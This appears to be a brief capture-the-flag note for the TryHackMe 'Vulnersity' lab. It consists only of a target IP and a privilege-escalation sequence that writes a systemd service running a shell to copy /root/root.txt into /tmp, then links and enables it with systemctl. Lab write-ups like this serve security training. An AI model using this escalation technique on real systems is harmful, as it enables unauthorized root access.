# TryHackMe Vulnersity

IP=10.10.93.0



`eop=$(mktemp).service`
```
echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' >$eop
```
`/bin/systemctl link $eop`
`/bin/systemctl enable --now $eop`
